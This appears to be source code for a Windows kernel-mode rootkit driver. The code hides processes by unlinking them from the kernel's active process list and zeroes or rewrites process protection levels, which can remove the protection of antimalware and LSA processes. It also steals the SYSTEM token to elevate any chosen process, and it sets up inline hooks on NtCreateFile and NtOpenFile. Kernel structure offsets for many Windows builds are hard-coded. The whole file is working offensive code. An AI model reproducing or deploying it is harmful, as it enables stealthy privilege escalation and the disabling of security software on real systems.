#include "header.h"


protection_level global_protection_levels = {
    .PS_PROTECTED_SYSTEM = 0x72,
    .PS_PROTECTED_WINTCB = 0x62,
    .PS_PROTECTED_WINDOWS = 0x52,
    .PS_PROTECTED_AUTHENTICODE = 0x12,
    .PS_PROTECTED_WINTCB_LIGHT = 0x61,
    .PS_PROTECTED_WINDOWS_LIGHT = 0x51,
    .PS_PROTECTED_LSA_LIGHT = 0x41,
    .PS_PROTECTED_ANTIMALWARE_LIGHT = 0x31,
    .PS_PROTECTED_AUTHENTICODE_LIGHT = 0x11
};

void IRP_MJCreate()
{
    DbgPrint("IRP_CREATED\n");

}

void IRP_MJClose()
{
    DbgPrint("IRP_CLOSED");

}

DWORD UnprotectAllProcesses() {
    PVOID process = NULL;
    PLIST_ENTRY plist;
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    NTSTATUS ret = PsLookupProcessByProcessId((HANDLE)4, (PEPROCESS*)&process);

    if (!NT_SUCCESS(ret))
    {
        if (ret == STATUS_INVALID_PARAMETER)
        {
            DbgPrint("the process ID was not found.");
        }
        if (ret == STATUS_INVALID_CID)
        {
            DbgPrint("the specified client ID is not valid.");
        }
        status = ret;
    }

    __try
    {
        plist = (PLIST_ENTRY)((char*)process + eoffsets.ActiveProcessLinks_offset);

        while (plist->Flink != (PLIST_ENTRY)((char*)process + eoffsets.ActiveProcessLinks_offset))
        {
            DbgPrint("Blink: %p, Flink: %p\n", plist->Blink, plist->Flink);

            ULONG_PTR EProtectionLevel = (ULONG_PTR)plist->Flink - eoffsets.ActiveProcessLinks_offset + eoffsets.protection_offset;

            *(BYTE*)EProtectionLevel = (BYTE)0;

            plist = plist->Flink;
        }
        status = STATUS_SUCCESS;
    }
    __finally {
        ObDereferenceObject(process);
        return (status);
    }

}

DWORD
HideProcess(
    int pid
)
{
    PVOID process = NULL;
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    PLIST_ENTRY plist;
    BOOLEAN lockAcquired = FALSE;

    __try
    {
        __try
        {

            NTSTATUS ret = PsLookupProcessByProcessId((HANDLE)pid, (PEPROCESS*)&process);

            if (ret != STATUS_SUCCESS)
            {
                if (ret == STATUS_INVALID_PARAMETER)
                {
                    DbgPrint("The process ID was not found.");
                }
                if (ret == STATUS_INVALID_CID)
                {
                    DbgPrint("The specified client ID is not valid.");
                }
                return (-1);
            }

            plist = (PLIST_ENTRY)((char*)process + eoffsets.ActiveProcessLinks_offset);

            ExAcquirePushLockExclusive(&pLock);
            lockAcquired = TRUE;

            if (plist->Flink == NULL || plist->Blink == NULL)
            {
                DbgPrint("Already Hidden\n");
                __leave;
            }

            if (plist->Flink->Blink != plist || plist->Blink->Flink != plist)
            {
                DbgPrint("Error: Inconsistent Flink and Blink pointers.");
                __leave;
            }

            plist->Flink->Blink = plist->Blink;
            plist->Blink->Flink = plist->Flink;

            plist->Flink = NULL;
            plist->Blink = NULL;

            DbgPrint("Process '%wZ' is now hidden", PsGetProcessImageFileName(process));

            status = STATUS_SUCCESS;
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            DbgPrint("An exception occurred while hiding the process.");
            return (GetExceptionCode());
        }
    }
    __finally
    {
        if (process)
            ObDereferenceObject(process);
        if (lockAcquired)
            ExReleasePushLockExclusive(&pLock);
    }
    return (status);
}


DWORD InitializeOffsets(Phooklist hooklist) {
    RTL_OSVERSIONINFOW pversion;

    RtlGetVersion(&pversion);

    DbgPrint("Windows build %lu.", pversion.dwBuildNumber);

    eoffsets.ActiveProcessLinks_offset = 0;
    eoffsets.Token_offset = 0;
    eoffsets.protection_offset = 0;

    // Initialize offsets based on the Windows build number
    if (pversion.dwBuildNumber >= 19041 && pversion.dwBuildNumber <= 19045) {
        eoffsets.ActiveProcessLinks_offset = 0x448;
        eoffsets.Token_offset = 0x4B8;
        eoffsets.protection_offset = 0x87A;
    }
    else if (pversion.dwBuildNumber == 18362 || pversion.dwBuildNumber == 17763) {
        eoffsets.ActiveProcessLinks_offset = 0x2F0;
        eoffsets.Token_offset = 0x360;
        eoffsets.protection_offset = 0x6FA;
    }
    else if (pversion.dwBuildNumber == 17134 || pversion.dwBuildNumber == 16299 || pversion.dwBuildNumber == 15063) {
        eoffsets.ActiveProcessLinks_offset = 0x2E8;
        eoffsets.Token_offset = 0x358;
        eoffsets.protection_offset = 0x6CA;
    }
    else if (pversion.dwBuildNumber == 22631 || pversion.dwBuildNumber == 22621 || pversion.dwBuildNumber == 22000) {
        eoffsets.ActiveProcessLinks_offset = 0x448;
        eoffsets.Token_offset = 0x4B8;
        eoffsets.protection_offset = 0x87A;
    }
    else if (pversion.dwBuildNumber == 26100)
    {
        eoffsets.ActiveProcessLinks_offset = 0x1d8;
        eoffsets.Token_offset = 0x248;
        eoffsets.protection_offset = 0x5fa;
    }

    if (eoffsets.ActiveProcessLinks_offset && eoffsets.Token_offset && eoffsets.protection_offset) {
        xHooklist.check_off = 0;
        return STATUS_SUCCESS;
    }

    DbgPrint("Unsupported Windows build %lu. Please open an issue in the repository with the given build number.", pversion.dwBuildNumber);
    xHooklist.check_off = 1;
    return STATUS_UNSUCCESSFUL;
}

DWORD PrivilegeElevationForProcess(int pid)
{
    PVOID process = NULL;
    PVOID systemProcess = NULL;
    PACCESS_TOKEN targetToken = NULL;
    PACCESS_TOKEN systemToken = NULL;

    __try
    {
        // Lookup the target process by PID
        NTSTATUS status = PsLookupProcessByProcessId((HANDLE)pid, &process);
        if (status != STATUS_SUCCESS)
        {
            switch (status)
            {
            case STATUS_INVALID_PARAMETER:
                DbgPrint("The process ID was not found.\n");
                break;
            case STATUS_INVALID_CID:
                DbgPrint("The specified client ID is not valid.\n");
                break;
            default:
                DbgPrint("Unknown error occurred while looking up process ID.\n");
                break;
            }
            return -1;
        }


        status = PsLookupProcessByProcessId((HANDLE)0x4, &systemProcess);
        if (status != STATUS_SUCCESS)
        {
            switch (status)
            {
            case STATUS_INVALID_PARAMETER:
                DbgPrint("System process ID was not found.\n");
                break;
            case STATUS_INVALID_CID:
                DbgPrint("The system ID is not valid.\n");
                break;
            default:
                DbgPrint("Unknown error occurred while looking up system process ID.\n");
                break;
            }
            return -1;
        }

        char* imageName = PsGetProcessImageFileName((PEPROCESS)process);
        DbgPrint("Target process image name: %s\n", imageName);

        targetToken = PsReferencePrimaryToken(process);
        if (!targetToken)
        {
            return -1;
        }

        DbgPrint("%s token: %x\n", imageName, targetToken);

        systemToken = PsReferencePrimaryToken(systemProcess);
        if (!systemToken)
        {
            return -1;
        }

        DbgPrint("System token: %x\n", systemToken);

        ULONG_PTR targetTokenAddress = (ULONG_PTR)process + eoffsets.Token_offset;
        DbgPrint("%s token address: %x\n", imageName, targetTokenAddress);

        ULONG_PTR systemTokenAddress = (ULONG_PTR)systemProcess + eoffsets.Token_offset;
        DbgPrint("System token address: %x\n", systemTokenAddress);

        *(PHANDLE)targetTokenAddress = *(PHANDLE)systemTokenAddress;
        DbgPrint("Process %s token updated to: %x\n", imageName, *(PHANDLE)(targetTokenAddress));
    }
    __finally
    {
        // Dereference objects in the finally block
        if (systemProcess)
        {
            ObDereferenceObject(systemProcess);
        }
        if (targetToken)
        {
            ObDereferenceObject(targetToken);
        }
        if (systemToken)
        {
            ObDereferenceObject(systemToken);
        }
        if (process)
        {
            ObDereferenceObject(process);
        }
    }

    return STATUS_SUCCESS;
}


NTSTATUS
ChangeProtectionLevel(
    PCR_SET_PROTECTION_LEVEL ProtectionLevel
)
{
    PVOID process = NULL;
    PPS_PROTECTION Protection;
    NTSTATUS ret = PsLookupProcessByProcessId(ProtectionLevel->Process, &process);

    if (ret != STATUS_SUCCESS)
    {
        if (ret == STATUS_INVALID_PARAMETER)
        {
            DbgPrint("the process ID was not found.");
        }
        if (ret == STATUS_INVALID_CID)
        {
            DbgPrint("the specified client ID is not valid.");
        }
        return (-1);
    }

    PPS_PROTECTION EProtectionLevel = (ULONG_PTR)process + eoffsets.protection_offset;

    *EProtectionLevel = ProtectionLevel->Protection;

    return (0);
}

NTSTATUS InitializeStructure(Phooklist hooklist_s)
{
    if (!hooklist_s)
    {
        DbgPrint("invalid structure provided \n");
        return (-1);

    }
    UNICODE_STRING NtCreateFile_STRING = RTL_CONSTANT_STRING(L"NtCreateFile");

    UNICODE_STRING NtOpenFile_STRING = RTL_CONSTANT_STRING(L"NtOpenFile");

    RtlInitUnicodeString(&hooklist_s->decoyFile, L"\\SystemRoot\\System32\\ntoskrnl.exe");

    hooklist_s->NtCreateFileAddress = MmGetSystemRoutineAddress(&NtCreateFile_STRING);

    if (!hooklist_s->NtCreateFileAddress)
    {
        DbgPrint("NtCreateFile NOT resolved\n");

        return (-1);
    }

    memset(hooklist_s->NtCreateFilePatch, 0x0, 12);

    hooklist_s->NtCreateFilePatch[0] = 0x48;
    hooklist_s->NtCreateFilePatch[1] = 0xb8;

    hooklist_s->NtCreateFilePatch[10] = 0xff;
    hooklist_s->NtCreateFilePatch[11] = 0xe0;

    DbgPrint("NtCreateFile resolved\n");

    hooklist_s->NtOpenFileAddress = MmGetSystemRoutineAddress(&NtOpenFile_STRING);

    if (!hooklist_s->NtOpenFileAddress)
    {
        DbgPrint("NtOpenFile NOT resolved\n");

        return (-1);
    }

    memset(hooklist_s->NtOpenFilePatch, 0x0, 12);

    hooklist_s->NtOpenFilePatch[0] = 0x48;
    hooklist_s->NtOpenFilePatch[1] = 0xb8;

    hooklist_s->NtOpenFilePatch[10] = 0xff;
    hooklist_s->NtOpenFilePatch[11] = 0xe0;

    DbgPrint("NtOpenFile resolved\n");

    DbgPrint("taking a copy before hook.. \n");

    memcpy(hooklist_s->NtCreateFileOrigin, hooklist_s->NtCreateFileAddress, 12);

    ExInitializePushLock(&pLock);

    return (0);
}

